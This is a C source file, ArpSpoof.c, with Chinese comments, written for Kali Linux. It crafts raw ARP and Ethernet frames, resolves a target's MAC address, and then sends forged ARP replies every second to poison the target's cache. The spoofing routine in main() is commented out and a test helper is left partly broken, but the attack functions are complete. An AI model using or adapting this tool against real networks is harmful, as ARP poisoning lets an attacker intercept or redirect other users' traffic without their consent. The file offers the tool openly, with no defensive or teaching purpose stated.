////////////////////////////////////
//文件说明:ArpSpoof.c
//作者:高小调
//创建时间:2017年07月05日 星期三 08时48分14秒
//开发环境:Kali Linux/g++ v6.3.0
////////////////////////////////////
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>
#include<sys/socket.h>
#include<ifaddrs.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<net/if.h>
#include<sys/ioctl.h>

//Arp报文
struct arp_packet{
	unsigned char hardw_type[2];		//硬件类型
	unsigned char prot_type[2];		//协议类型
	unsigned char hard_len;			//硬件地址长度
	unsigned char prot_len;			//协议地址长度
	unsigned char op[2];				//op 请求/应答
	unsigned char mac_sender[6];	//发送端以太网地址
	unsigned char ip_sender[4];			//发送端ip地址
	unsigned char dest_mac[6];		//接受端以太网地址
	unsigned char dest_ip[4];		//接受端ip地址
	unsigned char nop[18];			//填充(保证arp帧长度为46字节)
};
//构建Arp请求包
void init_arp_packet(struct arp_packet * ap,const char* src_ip,const char* src_mac,const char*dst_ip,const char* dst_mac,int reply){
	
	ap->hardw_type[0] = 0x00;
	ap->hardw_type[1] = 0x01;

	ap->prot_type[0] = 0x08;
	ap->prot_type[1] = 0x00;

	ap->hard_len = 0x06;

	ap->prot_len = 0x04;

	ap->op[0] = 0x00;
	ap->op[1]=reply==0?0x01:0x02;
	
	memcpy(ap->mac_sender,src_mac,sizeof(ap->dest_mac));
	
	*(int*)(ap->ip_sender) = inet_addr(src_ip);
	
	if(reply != 0){
		memcpy(ap->dest_mac,dst_mac,sizeof(ap->dest_mac));
	}else{
		ap->dest_mac[0] = 0x00;
		ap->dest_mac[1] = 0x00;
		ap->dest_mac[2] = 0x00;
		ap->dest_mac[3] = 0x00;
		ap->dest_mac[4] = 0x00;
		ap->dest_mac[5] = 0x00;
	}

	*((int*)ap->dest_ip) = inet_addr(dst_ip);
}
//以太网帧
struct ethernet_packet{
	unsigned char dest_mac[6];
	unsigned char src_mac[6];
	unsigned char frame_type[2];
	struct arp_packet ap;
};

//获取本地ip与mac地址
void get_local_info(const char* device,char ip[],char *mac){
	int sd = socket(AF_INET,SOCK_DGRAM,0);
	if(sd == -1){
		perror("socket");
		exit(1);
	}
	struct sockaddr_in addr;
	struct ifreq ifr;
	strcpy(ifr.ifr_name,device);
	if(ioctl(sd,SIOCGIFADDR,&ifr) < 0){
		//No such device
		perror("ioctl");
		exit(2);
	}
	memcpy(&addr,&ifr.ifr_addr,sizeof(addr));
	char * tmp = inet_ntoa(addr.sin_addr);
	strcpy(ip,tmp);
	
	if(ioctl(sd,SIOCGIFHWADDR,&ifr) < 0){
		perror("ioctl");
		exit(2);
	}
	//memcpy(mac,ifr.ifr_hwaddr.sa_data,sizeof(ifr.ifr_hwaddr.sa_data)); bug!
	memcpy(mac,ifr.ifr_hwaddr.sa_data,6);
	close(sd);
}

void init_ethernet_packet(struct ethernet_packet *ep,const char* src_ip,const char*src_mac,const char* dst_ip,const char* dst_mac,int type){
	if(type == 0){
		for(int i=0; i<6; ++i){
			ep->dest_mac[i] = 0xff;
		}
	}else{
		memcpy(ep->dest_mac,dst_mac,6);
	}
	memcpy(ep->src_mac,src_mac,6);

	ep->frame_type[0] = 0x08;
	ep->frame_type[1] = 0x06;

	init_arp_packet(&ep->ap,src_ip,src_mac,dst_ip,dst_mac,type);
}
void print_mac(const unsigned char*);
void get_other_mac2(const char* other_ip,const char* other_mac){
	int sd = socket(AF_INET,SOCK_DGRAM,0);
	if(sd < 0){
		perror("socket");
		exit(-5);
	}
	struct sockaddr_in other;
	struct ethernet_packet rcv;
	other.sin_family = AF_INET;
	other.sin_port = htons(rand()%65535 + 1024);
	other.sin_addr.s_addr = inet_addr(other_ip);
	int len = sizeof(other);
	if(sendto(sd,"1",1,0,(struct sockaddr*)&other,len) < 0){
		perror("sendto");
		exit(-2);
	}
	recv(sd,&rcv,sizeof(rcv),0);
	print_mac(rcv.dest_mac);
	print_mac(rcv.src_mac);
}

void get_other_mac(const char*dev,char *local_ip,char*local_mac,const char*other_ip,char*other_mac){
	struct ethernet_packet request;
	struct ethernet_packet rev;
	init_ethernet_packet(&request,local_ip,local_mac,other_ip,0,0);
	int sd = socket(AF_INET,SOCK_PACKET,htons(0x0806));
	if(sd < 0){
		perror("socket");
		exit(-1);
	}
	struct sockaddr sa;
	sa.sa_family = AF_INET;
	strcpy(sa.sa_data,dev);
	for(int i=0; i<3; ++i){
		if(sendto(sd,&request,sizeof(request),0,&sa,sizeof(sa)) < 0){
			perror("sendto");
			exit(-2);
		}
	}
	while(recv(sd,&rev,sizeof(rev),0) > 0){
		struct in_addr ip;
		ip.s_addr = *((int*)rev.ap.ip_sender);
		char *recv_ip = inet_ntoa(ip);
		if(rev.ap.op[1] == 0x02 && strcmp(recv_ip,other_ip) == 0){
			memcpy(other_mac,rev.src_mac,6);
			sleep(2);
			return ;
		}
	}
}
void udp_test(){
	


}
void print_mac(const unsigned char* mac){
	for(int i=0; i<5; ++i)
		printf("%2x:",mac[i]);
	printf("%2x\n",mac[5]);
}

void arpspoof(const char* dev,const char*host_ip,const char* host_mac,const char* target_ip,const char* target_mac){
	int sd = socket(AF_INET,SOCK_PACKET,htons(0x0806));
	if(sd < 0){
		perror("sd");
		exit(-5);
	}
	struct ethernet_packet ep;
	init_ethernet_packet(&ep,host_ip,host_mac,target_ip,target_mac,1);
	struct sockaddr sa;
	sa.sa_family = AF_INET;
	strcpy(sa.sa_data,dev);
	while( sendto(sd,&ep,sizeof(ep),0,&sa,sizeof(sa)) != -1){
		printf("告诉%s,我是%s\n",target_ip,host_ip);
		sleep(1);
	}
}	

int main(int argc,const char* argv[]){
	if(argc!=4){
		printf("Useage:%s [interface] [source_ip] [dest_ip]\n",argv[0]);
		return 0;
	}
	get_other_mac2(argv[2],NULL);
	/*
	const char* dev = argv[1];
	const char* host_ip = argv[2];
	const char* target_ip = argv[3];
	unsigned char local_ip[18] = {0};
	unsigned char local_mac[6] = {0};
	unsigned char host_mac[6] = {0};
	unsigned char target_mac[6] = {0};
	get_local_info(dev,local_ip,local_mac);
	printf("本地ip为:%s\n",local_ip);
	printf("本地mac为:");
	print_mac(local_mac);
	printf("正在获取目标mac...\n");
	get_other_mac(dev,local_ip,local_mac,target_ip,target_mac);
	printf("目标mac为:");
	print_mac(target_mac);
	arpspoof(dev,host_ip,local_mac,target_ip,target_mac);
*/
	return 0;
}
